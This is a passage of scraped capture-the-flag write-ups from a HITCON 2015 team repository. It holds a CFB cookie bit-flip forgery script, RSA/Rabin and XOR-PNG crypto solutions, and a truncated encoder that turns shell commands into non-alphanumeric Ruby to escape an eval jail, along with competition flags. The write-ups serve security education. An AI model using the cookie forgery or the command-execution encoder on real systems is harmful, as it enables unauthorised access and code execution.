'password': 'bbbbbbbbbbbbbbbbbbbbbbbbbbbb'}, allow_redirects=False)\ncookie = urllib2.unquote(response.cookies['auth'])\n\nsource = 'bbbbbbbbbbbb\",\"db\":\"hitcon-ctf\"}'\ntarget = 'bbb\",\"admin\":true}              '\n\ndef xor(x, y):\n    return ''.join(chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(x, y))\n\nkey = xor(cookie[-len(source):], source)\npayload = cookie[:-len(source)] + xor(key, target)[:-14]\n\nresponse = requests.get('http://52.69.244.164:51913/', cookies={'auth': urllib2.quote(payload)})\nprint response.content\n```\n\n**hitcon{WoW_CFB_m0dE_5o_eAsY}**\n", "timestamp": "2025-10-21T22:03:15.713639"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-18-hitcon/crypto_314_rsabin/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-18-hitcon/crypto_314_rsabin/README.md", "content": "﻿## Rsabin (crypro, 314p, 37 solves)\n\n> Classical things?\n\n> [rsabin-a51076632142e074947b08396bf35ab2.tgz](rsabin.tgz)\n\n### PL\n[ENG](#eng-version)\n\nZ dołączonego do zadania pliku tgz wypakowujemy dwa kolejne - [rsabin.py](rsabin.py) (kod szyfrujący coś)\noraz [cipher.txt](cipher.txt) (wynik wykonania go).\n\nKod szyfrujący wygląda tak:\n\n```python\nfrom Crypto.Util.number import *\n\np = getPrime(157)\nq = getPrime(157)\nn = p * q\ne = 31415926535897932384\n\nflag = open('flag').read().strip()\nassert len(flag) == 50\n\nm = int(flag.encode('hex'), 16)\nc = pow(m, e, n)\nprint 'n =', n\nprint 'e =', e\nprint 'c =', c\n```\n\nA dane tak:\n\n```\nn = 20313365319875646582924758840260496108941009482470626789052986536609343163264552626895564532307\ne = 31415926535897932384\nc = 19103602508342401901122269279664114182748999577286972038123073823905007006697188423804611222902\n```\n\nN jest na tyle małe, że można go sfaktoryzować (albo znaleźć w factordb):\n\n```\np = 123722643358410276082662590855480232574295213977\nq = n / p\n```\n\nNa pierwszy rzut oka szyfrowanie wygląda na klasyczne RSA. Uwagę przykuwa jednak dość nietypowy wybór eksponenty szyfrującej `e`. Jej dalsza analiza pozwala stwierdzić, że całe szyfrowanie jest wykonane `niepoprawnie`, ponieważ eksponenta nie spełnia założenia `gcd(e, (p-1)(q-1)) == 1`. Brak tego założenia sprawia, że RSA nie może poprawnie zdekodować zaszyfrowanej wiadomości.\nFaktoryzacja `e` pozwala stwierdzić że ma ona `2^5` w swoim rozkładzie na czynniki i z tego powodu ma wspólne dzielniki z `(p-1)(q-1)`. Musimy się więc pozbyć tego czynnika z wykładnika. Kilka godzin czytania na temat RSA oraz arytmetyki modularnej pozwala nam dojść do wniosku, że możemy wykorzystać Algorytm Rabina (stąd też zapewne gra słów w tytule zadania) aby pozbyć się niechcianego czynnika z eksponenty.\n\nRSA koduje dane poprzez:\n\n`cipher_text = (plain_text^e)%n`\n\nAlgorytm Rabina szyfruje jako:\n\n`cipher_text = (plain_text^2)%n`\n\nW naszym przypadku możemy przyjąć, że `e = e'*32` i uzyskujemy dzięki temu:\n\n`cipher_text = (plain_text^e)%n = (plain_text^(e'*32))%n`\n\nTeraz jeśli oznaczymy `x = plain_text^e'*16` to nasze równanie będzie miało postać `cipher_text = (x^2)%n` czyli dokładnie postać znaną z Algorytmu Rabina! Oznacza to, że dekodując nasz zaszyfrowany tekst Algorytmem Rabina możemy uzyskać potencjalne wartości `x`. Warto wspomnieć, że takich potencjalnych wartości będzie 4 bo algorytm jest niejednoznaczny.\n\nMożemy zaprezentowaną metodę stosować wielokrotnie, a każde zastosowaniede szyfrowania z Algorytmu Rabina spowoduje \"usunięcie\" jednego czynnika 2 z wykładnika. To oznacza, ze jednokrotne deszyfrowanie da nam możliwe wartości `plain_text^e'*16`, kolejne `plain_text^e'*8`, ..., a piąte `plain_text^e'`\n\nWidzimy więc, że po pięciu deszyfrowaniach uzyskamy wreszcie postać którą będziemy mogli odszyfrować za pomocą RSA, pamiętając przy tym, że nasza eksponenta uległa zmianie i wynosi teraz `31415926535897932384/32`.\n\nWykonujemy więc:\n\n```python\nn = 20313365319875646582924758840260496108941009482470626789052986536609343163264552626895564532307L\np = 123722643358410276082662590855480232574295213977L\nq = n / p\ne = 31415926535897932384L\ne_p = e / 32\nct = 19103602508342401901122269279664114182748999577286972038123073823905007006697188423804611222902\nd = get_d(p, n, e_p)\n\nrabin = Rabin(p, q)\npartially_decoded_ct = [ct]\nfor i in range(5):\n    new_partially_decoded_ct = []\n    for ct_p in partially_decoded_ct:\n        new_ct_p = rabin.decrypt(ct_p)\n        new_partially_decoded_ct.extend(list(new_ct_p))\n    partially_decoded_ct = set(new_partially_decoded_ct)\n\npotential_plaintext = []\nfor potential_rsa_ct in partially_decoded_ct:\n    pt = pow(potential_rsa_ct, d, n)\n    potential_plaintext.append(pt)\nprint(potential_plaintext)\n```\n\nKompletny kod dla tego kroku jest dostępny [tutaj](rsa_rabin.py).\n\nTeoretycznie każde deszyfrowanie Rabina mogło dać nam 4 różne potencjalne plaintexty, w praktyce niektóre są identyczne więc ich liczba finalnie wyniosła 16.\n\nTak więc otrzymujemy w końcu listę liczb które mogły potencjalnie być szyfrowaną wiadomością. Nie jest ona specjalnie długa:\n\n```\n11781957604393222865231495052284116318876440682267206215409582095778432861874348660845251848045\n4169292882246487226436372571580328445408188970955313275707356349635909107039805208587333631745\n1170873348295885335059944818034561278496937179514286352764111586578035361653036340797178495797\n13871573946024796279189581177591269513969694950673020202114872377044854770083045515434824811804\n6441791373850850303735177662669226594971314531797606586938114159564488393181507111460739720503\n19142491971579761247864814022225934830444072302956340436288874950031307801611516286098386036510\n16144072437629159356488386268680167663532820511515313513345630186973434056224747418308230900562\n8531407715482423717693263787976379790064568800203420573643404440830910301390203966050312684262\n1055425717878104375386098355306535487232069922237396940514031160338383741028199997840854113277\n13756126315607015319515734714863243722704827693396130789864791950805203149458209172478500429284\n11591134129841181208716021381503690146413855638482506249018420423689972012921602773678731165798\n3978469407694445569920898900799902272945603927170613309316194677547448258087059321420812949498\n16334895912181201013003859939460593835995405555300013479736791859061894905177493305474751582809\n8722231190034465374208737458756805962527153843988120540034566112919371150342949853216833366509\n6557239004268631263409024125397252386236181789074495999188194585804140013806343454417064103023\n19257939601997542207538660484953960621708939560233229848538955376270959422236352629054710419030\n```\n\nWięc co pozostaje? Tylko odczytać je jako tekst i uzyskać flagę? Jest mały problem - w źródle widzimy:\n\n`assert len(flag) == 50`\n\nA jednocześnie `len(long_to_bytes(n))` jest równe 40 - to oznacza, że nasza szyfrowana wiadomość o długości 50 bajtów\njest przycinana przez modulo. Co z tym zrobić? Jedyne co się da to bruteforce - ale niestety, 10 bajtów to dużo\nza dużo na jakikolwiek bruteforce. Na szczęście - wiemy coś o wiadomości. Konkretnie, jak się zaczyna i kończy.\nNa pewno jest to flaga, więc pierwsze bajty to `hitcon{` a ostatni bajt to `}`.\n\nRozpiszmy sobie, jak wygląda flaga, oraz kilka naszych pomocniczych zmiennych (o nich później):\n\n```python\nflag  = hitcon{ABCxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzx}\nconst = hitcon{                                  }\nbrute =        ABC\nmsg   =           xyzxyzxyzxyzxyzxyzxyzxyzxyzxyzx\n```\n\nPo co taki podział? Otóż znamy `flag % n`, ale niestety, jest to niejednoznaczne (bo `flag` ma 50 bajtów, a `n` 40).\nAle gdybyśmy poznali samo \"msg\", to `msg % n` jest już jednoznaczne (bo jest krótsze niż `n`). A jak go poznać?\nNa pewno znamy `const` - możemy odjąć je od flagi. Możemy też brutować `brute` - to tylko trzy bajty, i sprawdzać\nkażde możliwe `msg` po kolei.\n\nPiszemy kod łamiący/bruteforcujący flagę:\n\n```python\ndef crack_flag(ct, n):\n    n_len = 40\n    flag_len = 50\n    const = int('hitcon{'.encode('hex'), 16) * (256**(flag_len - 7))\n    for a in range(32, 128):\n        for b in range(32, 128):\n            for c in range(32, 127):\n                brute = (a * 256 * 256 + b * 256 + c) * (256**(flag_len - 10))\n                flag = (ct - const - brute) % n \n                flag = (flag - ord('}')) * modinv(256, n) % n\n                flagstr = long_to_bytes(flag)\n                if all(32 <= ord(c) <= 128 for c in flagstr):\n                    print chr(a) + chr(b) + chr(c) + flagstr\n\nn = 20313365319875646582924758840260496108941009482470626789052986536609343163264552626895564532307\n\nfor msg in possible_inputs:\n    print 'testing', msg\n    crack_flag(msg, n)\n```\n\nPo uruchomieniu go, ostatecznie dostajemy flagę w swoje ręce:\n\n`Congratz~~! Let's eat an apple pi <3.14159`\n\nPamiętamy żeby dopisać obciętą stałą część:\n\n`hitcon{Congratz~~! Let's eat an apple pi <3.14159}`\n\nJesteśmy 314 punktów do przodu.\n\n### ENG version\n\nFrom the task archive we extract two files: [rsabin.py](rsabin.py) (cipher code) and [cipher.txt](cipher.txt) (results of the cipher code).\n\nCipher code is:\n\n```python\nfrom Crypto.Util.number import *\n\np = getPrime(157)\nq = getPrime(157)\nn = p * q\ne = 31415926535897932384\n\nflag = open('flag').read().strip()\nassert len(flag) == 50\n\nm = int(flag.encode('hex'), 16)\nc = pow(m, e, n)\nprint 'n =', n\nprint 'e =', e\nprint 'c =', c\n```\n\nAnd the result data:\n\n```\nn = 20313365319875646582924758840260496108941009482470626789052986536609343163264552626895564532307\ne = 31415926535897932384\nc = 19103602508342401901122269279664114182748999577286972038123073823905007006697188423804611222902\n```\n\nN is small enough to factor (or check in factordb):\n\n```\np = 123722643358410276082662590855480232574295213977\nq = n / p\n```\n\nAt the first glance the cipher resembles classical RSA. What catches attention is an unusual choice of cipher exponent `e`. Exponent analysis leads us to conclusion that the whole cipher is `incorrect` as RSA since the exponent violates the assumption `gcd(e, (p-1)(q-1)) == 1`. Lack of this property means that RSA cannot correctly decrypt the message simply by applying the decryption exponent `d`.\n\nFactorization of `e` shows us that is has `2^5` as factor and therefore it has common divisors with `(p-1)(q-1)`. We need to get rid of this factor from exponent. Few hours reading about RSA and modular arythmetics leads us to conclusion that we can use Rabin Algorithm (this is probably the reason for word play in the task title) to remove the unwanted part of exponent.\n\nRSA encodes the data by:\n\n`cipher_text = (plain_text^e)%n`\n\nRabin Algorithm does this by:\n\n`cipher_text = (plain_text^2)%n`\n\nIf we introduce a new variable `e'` such that `e = e'*32` we get:\n\n`cipher_text = (plain_text^e)%n = (plain_text^(e'*32))%n`\n\nNow if we introduce a new variable `x` such that `x = plain_text^e'*16` then our equation will be `cipher_text = (x^2)%n` which is exactly the ciphertext formula from Rabin Algorithm! This means that we can use decrypt function from Rabin Algorithm on our ciphertext and get potential `x` values. It's worth noting that there will be 4 potential values since this algorithm is ambigious.\n\nWe can use the presented method multiple times and each Rabin decryption run will \"remove\" a 2 factor from exponent. This means that single decryption will give us potential values of `plain_text^e'*16`, next one `plain_text^e'*8`, ..., and the fifth will give `plain_text^e'`\n\nWe can see that after five consecutive decryptions we will finally get a ciphertext that can be decoded by RSA. We need to keep in mind here that the exponent for RSA is now changed because we removed the 32 so it is now: `31415926535897932384/32`.\n\nWe execute the code:\n\n```python\nn = 20313365319875646582924758840260496108941009482470626789052986536609343163264552626895564532307L\np = 123722643358410276082662590855480232574295213977L\nq = n / p\ne = 31415926535897932384L\ne_p = e / 32\nct = 19103602508342401901122269279664114182748999577286972038123073823905007006697188423804611222902\nd = get_d(p, n, e_p)\n\nrabin = Rabin(p, q)\npartially_decoded_ct = [ct]\nfor i in range(5):\n    new_partially_decoded_ct = []\n    for ct_p in partially_decoded_ct:\n        new_ct_p = rabin.decrypt(ct_p)\n        new_partially_decoded_ct.extend(list(new_ct_p))\n    partially_decoded_ct = set(new_partially_decoded_ct)\n\npotential_plaintext = []\nfor potential_rsa_ct in partially_decoded_ct:\n    pt = pow(potential_rsa_ct, d, n)\n    potential_plaintext.append(pt)\nprint(potential_plaintext)\n```\n\nComplete code for this step is available [here](rsa_rabin.py).\n\nTheoretically each Rabin decryption could give 4 different potential plaintexts, however in reality a lot of them were identical so finally there were only 16 to check.\n\nSo we end up with a list of potential plaintext values. It's not very long:\n\n```\n11781957604393222865231495052284116318876440682267206215409582095778432861874348660845251848045\n4169292882246487226436372571580328445408188970955313275707356349635909107039805208587333631745\n1170873348295885335059944818034561278496937179514286352764111586578035361653036340797178495797\n13871573946024796279189581177591269513969694950673020202114872377044854770083045515434824811804\n6441791373850850303735177662669226594971314531797606586938114159564488393181507111460739720503\n19142491971579761247864814022225934830444072302956340436288874950031307801611516286098386036510\n16144072437629159356488386268680167663532820511515313513345630186973434056224747418308230900562\n8531407715482423717693263787976379790064568800203420573643404440830910301390203966050312684262\n1055425717878104375386098355306535487232069922237396940514031160338383741028199997840854113277\n13756126315607015319515734714863243722704827693396130789864791950805203149458209172478500429284\n11591134129841181208716021381503690146413855638482506249018420423689972012921602773678731165798\n3978469407694445569920898900799902272945603927170613309316194677547448258087059321420812949498\n16334895912181201013003859939460593835995405555300013479736791859061894905177493305474751582809\n8722231190034465374208737458756805962527153843988120540034566112919371150342949853216833366509\n6557239004268631263409024125397252386236181789074495999188194585804140013806343454417064103023\n19257939601997542207538660484953960621708939560233229848538955376270959422236352629054710419030\n```\n\nSo what is left? Just read the values as text? Unfortunately there is a problem - in the cipher code we have:\n\n`assert len(flag) == 50`\n\nBut at the same time `len(long_to_bytes(n))` equals 40 - this means that our message was 50 bytes long and got \"cut\" by modulo operation. What can we do? The only way is a brute-force - but brute-forcing 10 bytes is a lot. Fortunately we know some things about the message. We know the prefix and suffix. It has to be the flag therefore it starts with `hitcon{` and ends with `}`.\n\nLet's start with drawing how the flag and our additional variables look like:\n\n```python\nflag  = hitcon{ABCxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzx}\nconst = hitcon{                                  }\nbrute =        ABC\nmsg   =           xyzxyzxyzxyzxyzxyzxyzxyzxyzxyzx\n```\n\nWhy this division? We know the value of `flag %n` but it is ambigious (since `flag` has 50 bytes and `n` has 40).\nHowever is we know only \"msg\" part then `msg % n` is not ambigious (since it is shorter than n). But how to get it?\nWe know `const` so we can cut this out of the flag. We can also brute-force the `brute` part - this is only 3 bytes, and check every possible `msg`.\n\nWe write the code to crack the flag:\n\n```python\ndef crack_flag(ct, n):\n    n_len = 40\n    flag_len = 50\n    const = int('hitcon{'.encode('hex'), 16) * (256**(flag_len - 7))\n    for a in range(32, 128):\n        for b in range(32, 128):\n            for c in range(32, 127):\n                brute = (a * 256 * 256 + b * 256 + c) * (256**(flag_len - 10))\n                flag = (ct - const - brute) % n \n                flag = (flag - ord('}')) * modinv(256, n) % n\n                flagstr = long_to_bytes(flag)\n                if all(32 <= ord(c) <= 128 for c in flagstr):\n                    print chr(a) + chr(b) + chr(c) + flagstr\n\nn = 20313365319875646582924758840260496108941009482470626789052986536609343163264552626895564532307\n\nfor msg in possible_inputs:\n    print 'testing', msg\n    crack_flag(msg, n)\n```\n\nAfter we run it we finally get the flag from one of ciphertexts:\n\n`Congratz~~! Let's eat an apple pi <3.14159`\n\nWe also remember that we removed the const part:\n\n`hitcon{Congratz~~! Let's eat an apple pi <3.14159}`\n\nAnd we have +314 points.", "timestamp": "2025-10-21T22:03:16.002147"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-18-hitcon/crypto_314_rsabin/cipher.txt", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-18-hitcon/crypto_314_rsabin/cipher.txt", "content": "n = 20313365319875646582924758840260496108941009482470626789052986536609343163264552626895564532307\ne = 31415926535897932384\nc = 19103602508342401901122269279664114182748999577286972038123073823905007006697188423804611222902\n", "timestamp": "2025-10-21T22:03:16.106724"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-18-hitcon/forensic_250_puzzleng/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-18-hitcon/forensic_250_puzzleng/README.md", "content": "﻿## Puzzleng (forensic, 150p, 24 solves)\n\n> Next Generation of Puzzle!\n\n> [puzzleng-edb16f6134bafb9e8b856b441480c117.tgz](puzzleng.tgz)\n\n### PL\n[ENG](#eng-version)\n\nZ dołączonego do zadania pliku tgz wypakowujemy dwa kolejne - [encrypt](encrypt) (to binarka, elf) oraz [flag.puzzle](flag.puzzle) (nieznany typ pliku).\nŁatwo domyślić się że jeden to kod którym zostały zaszyfrowane dane, a drugi to same zaszyfrowane dane.\n\nPrzepisujemy kod szyfrujący do C żeby móc go dokładniej przeanalizować:\n\n```c\nint main(int argc, char *argv[]) {\n    char hash[20];\n    assert(argc == 3);\n    int password_len = strlen(argv[1]);\n    SHA1(argv[1], password_len, hash);\n    stream = fopen(argv[2], \"r\");\n    assert(stream);\n    fseek(stream, 0LL, 2);\n    int data_len = ftell(stream);\n    rewind(stream);\n    for (int i = 0; i <= 19; ++i) {\n        for (int j = 0; j < (data_len + 19) / 20; ++j) {\n            int chr = fgetc(stream);\n            if (chr == -1) break;\n            putchar(chr ^ hash[i]);\n        }\n    }\n}\n```\n\nJak widać działanie jest bardzo proste - dzieli plik wejściowy na 20 bloków, i każdy z nich xoruje z innym bajtem.\nBajty z którymi szyfruje są losowe (wynik SHA1) więc ich nie zgadniemy.\n\nAle wydaje się to być banalne, albo wręcz trywialne zadanie. W końcu xorowanie po bajcie to jedna z najsłabszych\nmetod szyfrowania jaką można wymyślić. Zakładamy więc że dane które zostały zaszyfrowane to plaintext, i piszemy\nna szybko dekryptor (źródło już nie istnieje, ale pomysł był prosty - dla każdego bloku sprawdzenie, z jakim bajtem\ngo trzeba xorować żeby po xorowaniu wszystkie bajty były plaintekstem). Bardzo się zawiedliśmy - nie ma takich \nbajtów, więc dane które zostały zaszyfrowane nie są plaintextem.\n\nW przypływie natchnienie sprawdzamy co innego - czy da się znaleźć taki bajt, że po xor-owaniu go z pierwszym blokiem\nw wyniku będzie gdzieś \"IHDR\". I nie myliliśmy się - dane które otrzymaliśmy to zaszyfrowany plik .png:\n\n```python\ns = open('flag.puzzle', 'rb').read()\n\nchunk_len = (1135+19)/20\nchunks = [s[chunk_len*i:chunk_len*(i+1)] for i in range(20)]\n\ndef xor(a, b):\n    return ''.join(chr(ord(ac) ^ ord(bc)) for ac, bc in zip(a, b))\n\nfor i in range(len(chunks)):\n    c = chunks[i]\n    for b in range(256):\n        xx = xor(c, chr(b)*10000)\n        if 'IHDR' in xx:\n            print i, b, xx, xx.encode('hex')\n```\n\nCo teraz? Wiemy już z jakim bajtem był xorowany pierwszy blok, ale mamy 19 do zgadnięcia. Zrobiliśmy to samo dla 'IDAT' i 'IEND',\nzgadując kolejne dwa bajty. Niestety to ślepa uliczka - pikseli obrazka w ten sposób nie zgadniemy (a przynajmniej nie mieliśmy pomysłu żadnego).\n\nDlatego poszliśmy inną drogą - wiemy jak zaczynają się dane chunka IDAT (to stream zlibowy), bo mamy ich fragment:  \n\n```python\nstart = '789CEDCF418AE4300C05D0DCFFD2358BC6485F76'.decode('hex')\n```\n\nStream zlibowy prawdopodobnie nie zadziała dla wszystkich danych - możemy próbować deszyfrować drugi blok, i patrzeć kiedy będzie leciał wyjątek podczas dekompresji:\n\n```python\nknown = {\n    0: 101,\n    1: 48\n}\n\ncurr = start\nfor ndx in range(2, 20):\n    c = chunks[ndx]\n    if not known.has_key(ndx):\n        for i in range(256):\n            xx = xor(c, chr(i)*10000)\n            try:\n                zl = zlib.decompressobj().decompress(curr+xx)\n            except:\n                continue\n            known[ndx] = i\n    print known[ndx]\n    xxok = xor(c, chr(known[ndx])*10000)\n    curr = curr + xxok\n```\n\nBył to bardzo obiecujący sposób, ale niestety skończył się niepowodzeniem - o ile zawartość trzeciego bloku \nodzyskaliśmy (był tylko jeden bajt który nie powodował wyjątku), przy czwartym i dalej bloku za wiele danych dekompresowało się poprawnie.\n\nWięc wykorzystaliśmy to co wiedzieliśmy o obrazku (wyciągniętą z rozszyfrowanej sekcji IDAT) - miał szerokość 912 pikseli oraz \njednobitową paletę (czyli prawdopodobnie czarno-biały). I teraz cechą plików png, jest to że na początku każdego wiersza danych znajduje\nsię filtr którym są one traktowane. Mniejsza o technikalia, wynika z tego że co 115 bajt w zdekompresowanych danych powinien być równy\n'\\x00' (tzn. nie musiał jeśli byłyby użyte inne filtry, ale po analizie fragmentów danych które mieliśmy zauważyliśmy że tutaj używany\nwszędize jest filtr 0, jak zazwyczaj w png).\n\n\n```python\ndef testraw(raw):\n    for i in range(len(raw) / 115):\n        if raw[i*115] != '\\0':\n            return False\n    return True\n```\n\nNowa wersja:\n\n```python\ncurr = start\nfor ndx in range(2, 20):\n    c = chunks[ndx]\n    if not known.has_key(ndx):\n        for i in range(256):\n            xx = xor(c, chr(i)*10000)\n            try:\n                zl = zlib.decompressobj().decompress(curr+xx)\n            except:\n                continue\n            if testraw(zl):\n                known[ndx] = i\n    print known[ndx]\n    xxok = xor(c, chr(known[ndx])*10000)\n    curr = curr + xxok\n```\n\nNiestety, było to dalej niewystarczające - ciągle więcej niż jeden bajt spełniał nasze warunki, więc musieliśmy je jakoś oceniać.\nJako że zauważyliśmy że w błędnie zdekompresowanych plikach na końcu znajdywały się głównie zera (czarne piksele), wartościowaliśmy po ilości\nnieczarnych pikseli w wyniku po dekompresji. Ostateczna wersja:\n\n```python\ncurr = start\nfor ndx in range(2, 20):\n    clean()\n    c = chunks[ndx]\n    if not known.has_key(ndx):\n        mingap = 0\n        for i in range(256):\n            xx = xor(c, chr(i)*10000)\n            try:\n                zl = zlib.decompressobj().decompress(curr+xx)\n            except:\n                continue\n            if testraw(zl):\n                gap = len([True for x in zl[-500:] if x != '\\x00'])\n                if gap > mingap:\n                    known[ndx] = i\n                    mingap = gap\n    print known[ndx]\n    xxok = xor(c, chr(known[ndx])*10000)\n    curr = curr + xxok\n```\n\nUdało się, dostaliśmy jakieś dane. Po zapisaniu ich do pliku otrzymaliśmy piękny QR code:\n\n![result](result.png)\n\nPo dekodowaniu:\n\n`hitcon{qrencode -s 16 -o flag.png -l H --foreground 8F77B5 --background 8F77B4}`\n\n### ENG version\n\nWe unpacked two files from tgz attached to task: [encrypt](encrypt) (elf binary) and [flag.puzzle](flag.puzzle) (unknown file).\nIt was obvious to us that first file is binary used to encrypt some data, and second file is result of that encryption.\n\nWe disassembled and rewritten binary to C to simplify analysis:\n\n```c\nint main(int argc, char *argv[]) {\n    char hash[20];\n    assert(argc == 3);\n    int password_len = strlen(argv[1]);\n    SHA1(argv[1], password_len, hash);\n    stream = fopen(argv[2], \"r\");\n    assert(stream);\n    fseek(stream, 0LL, 2);\n    int data_len = ftell(stream);\n    rewind(stream);\n    for (int i = 0; i <= 19; ++i) {\n        for (int j = 0; j < (data_len + 19) / 20; ++j) {\n            int chr = fgetc(stream);\n            if (chr == -1) break;\n            putchar(chr ^ hash[i]);\n        }\n    }\n}\n```\n\nEncryption method is really simple - program splits input file to 20 blocks of equal length, than xors each of them with another byte.\n\nAt this moment challenge seems to be very easy, almost trivial - after all xoring data with single byte is one of weakest existing methods of encryption.\nWe assumed that encrypted data was plain text, and tried to bruteforce bytes in sha1 that was used to xor them. If our assumption was true, we could\nfind byte such that ciphertext_byte ^ byte is printable ascii for each byte in ciphetext - but it was not possible. That means, data that was encrypted is not textual.\n\nSo we checked another possiblity - we tried bruteforcing bytes for first block, but this time we hoped for 'IHDR' in decrypted string. And we were right -\nour encrypted data used to be .png file.\n\n```python\ns = open('flag.puzzle', 'rb').read()\n\nchunk_len = (1135+19)/20\nchunks = [s[chunk_len*i:chunk_len*(i+1)] for i in range(20)]\n\ndef xor(a, b):\n    return ''.join(chr(ord(ac) ^ ord(bc)) for ac, bc in zip(a, b))\n\nfor i in range(len(chunks)):\n    c = chunks[i]\n    for b in range(256):\n        xx = xor(c, chr(b)*10000)\n        if 'IHDR' in xx:\n            print i, b, xx, xx.encode('hex')\n```\n\nNow what? We know byte that was used to encrypt first block, but we have 19 more to go. We used the same method to find 'IDAT' and 'IEND', leaving us\nwith 17 unknown bytes.\n\nThat turned out to be dead end, so we tried something completely different. We know first few bytes of IDAT section (because we decrypted block with IDAT)\n\n```python\nstart = '789CEDCF418AE4300C05D0DCFFD2358BC6485F76'.decode('hex')\n```\n\nWe know that this is zlib stream, and that next block, after decrypting and appending to this fragment, should form correct zlib stream\nas well (otherwise it will probably throw some exception)\n\n```python\nknown = {\n    0: 101,\n    1: 48\n}\n\ncurr = start\nfor ndx in range(2, 20):\n    c = chunks[ndx]\n    if not known.has_key(ndx):\n        for i in range(256):\n            xx = xor(c, chr(i)*10000)\n            try:\n                zl = zlib.decompressobj().decompress(curr+xx)\n            except:\n                continue\n            known[ndx] = i\n    print known[ndx]\n    xxok = xor(c, chr(known[ndx])*10000)\n    curr = curr + xxok\n```\n\nThis method was really promising, but we didn't get very far with it. We decrypted third block with ease (only one byte didn't throw exception),\nbut fourth and later blocks decompression threw exceptions much sparser and left us with too much posibilities to bruteforce.\n\nSo we used our knowledge about image (that we acquired after decrypting IDAT section) - it's 912 pixels wide, 912 pixels height, and have 1bit palette\n(black and white probably). We remembered that each row in decompressed raw png data starts with 'filter byte' (this byte allows encoders/decoders to preprocess\nraw pixel data, potentially reducing final file size). After analysing blocks that we managed to decompress, we concluded that all filter bytes are equal to 0, \nso every 115-th byte in decompressed data should be equal to '\\x00'. Using this knowledge we updated our decryptor:\n\n```python\ndef testraw(raw):\n    for i in range(len(raw) / 115):\n        if raw[i*115] != '\\0':\n            return False\n    return True\n```\n\nNew version:\n\n```python\ncurr = start\nfor ndx in range(2, 20):\n    c = chunks[ndx]\n    if not known.has_key(ndx):\n        for i in range(256):\n            xx = xor(c, chr(i)*10000)\n            try:\n                zl = zlib.decompressobj().decompress(curr+xx)\n            except:\n                continue\n            if testraw(zl):\n                known[ndx] = i\n    print known[ndx]\n    xxok = xor(c, chr(known[ndx])*10000)\n    curr = curr + xxok\n```\n\nAlas, that still wasn't it - too many bytes passed this test. We noticed that incorrectly decompressed data contained a lot of zeroes at the end.\nSo we decided to grade possible solutions according to number of '\\x00' bytes at the end (the less the better). Final version:\n\n```python\ncurr = start\nfor ndx in range(2, 20):\n    clean()\n    c = chunks[ndx]\n    if not known.has_key(ndx):\n        mingap = 0\n        for i in range(256):\n            xx = xor(c, chr(i)*10000)\n            try:\n                zl = zlib.decompressobj().decompress(curr+xx)\n            except:\n                continue\n            if testraw(zl):\n                gap = len([True for x in zl[-500:] if x != '\\x00'])\n                if gap > mingap:\n                    known[ndx] = i\n                    mingap = gap\n    print known[ndx]\n    xxok = xor(c, chr(known[ndx])*10000)\n    curr = curr + xxok\n```\n\nWe did it, that method gave us correct byte that each block was xored with (stored in `known` dictionary). After saving decrypted data to file, we get\nbeautiful QR code:\n\n![result](result.png)\n\nAfter decoding:\n\n`hitcon{qrencode -s 16 -o flag.png -l H --foreground 8F77B5 --background 8F77B4}`\n", "timestamp": "2025-10-21T22:03:16.368257"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-18-hitcon/misc_200_hardtosay/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-18-hitcon/misc_200_hardtosay/README.md", "content": "﻿## HardToSay (misc, 200p, (111, 88, 73, 28) solves)\n\n    Ruby on Fails.\n    FLAG1: nc 54.199.215.185 9001\n    FLAG2: nc 54.199.215.185 9002\n    FLAG3: nc 54.199.215.185 9003\n    FLAG4: nc 54.199.215.185 9004\n\n    hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb\n\n### PL\n[ENG](#eng-version)\n\nDostajemy taki kod:\n\n```ruby\n\n#!/usr/bin/env ruby\n\nfail 'flag?' unless File.file?('flag')\n\n$stdout.sync = true\n\nlimit = ARGV[0].to_i\nputs \"Hi, I can say #{limit} bytes :P\"\ns = $stdin.gets.strip!\n\nif s.size > limit || s[/[[:alnum:]]/]\n  puts 'oh... I cannot say this, maybe it is too long or too weird :('\n  exit\nend\n\nputs \"I think size = #{s.size} is ok to me.\"\nr = eval(s).to_s\nr[64..-1] = '...' if r.size > 64\nputs r\n```\n\nJak widać pobiera on od użytkownika kod, i evaluje go - ale tylko pod warunkiem że nie zawiera znaków alfanumerycznych i jest odpowiednio krótki.\n\nSą cztery serwery z zadaniem - każdy z nich przyjmuje mniej znaków. Pierwszy 1024, drugi 64, trzeci 36, a czwarty tylko 10. Za pokonanie każdego dostajemy 50 punktów.\n\nNajlepszym rozwiązaniem na jakie wpadliśmy na początku to wykonanie operacji na shellu za pomocą backticków (``` ` ```) i interpolowania stringów.\n\nOpieramy się tutaj na kilku wartościach które są domyślnie dostępne w interpreterze, np. `$$` zwraca nam PID aktualnego procesu, więc wykonanie `$$/$$` da nam wynik `1`. Możemy w ten sposób uzyskać dowolne liczby, a stosując `''<<number` możemy generować także dowolne znaki ASCII.\n\nNapisaliśmy sobie prosty enkoder wykonujący dowolne (odpowiednio krótkie) polecenie shellowe:\n\n```python\ndef encode(cmd):\n    out = \"\"\"a1 = $$/$$\n    a2 = a1+a1\n    a4 = a2+a2\n    a8 = a4+a4\n    a16 = a8+a8\n    a32 = a16+a16\n    a64 = a32+a32\n    \"\"\"\n\n    ss = []\n    for c in cmd:\n        cc = ord(c)\n        vs = []\n        for b in range(8):\n            if (2**b) & ord(c):\n                vs.append('a'+str(2**b))\n        ss.append('(' + '+'.join(vs) + \")\")\n    s = '(\"\"<<' + '<<'.join(ss) + \")\"\n\n    end = \"`#{\" + s + \"}`\"\n\n    start = out + end\n\n    varnames = ['_'*i for i in range(1,10)][::-1]\n\n    start = start.replace('a64', varnames.pop())\n    start = start.replace('a32', varnames.pop())\n    start = start.replace('a16', varnames.pop())\n    start = start.replace('a8', varnames.pop())\n    start = start.replace('a4', varnames.pop())\n    start = start.replace('a2', varnames.pop())\n    start = start.replace('a1', varnames.pop())\n    start = ';'.join(start.split('\\n'))\n    return start\n\nimport sys\nprint 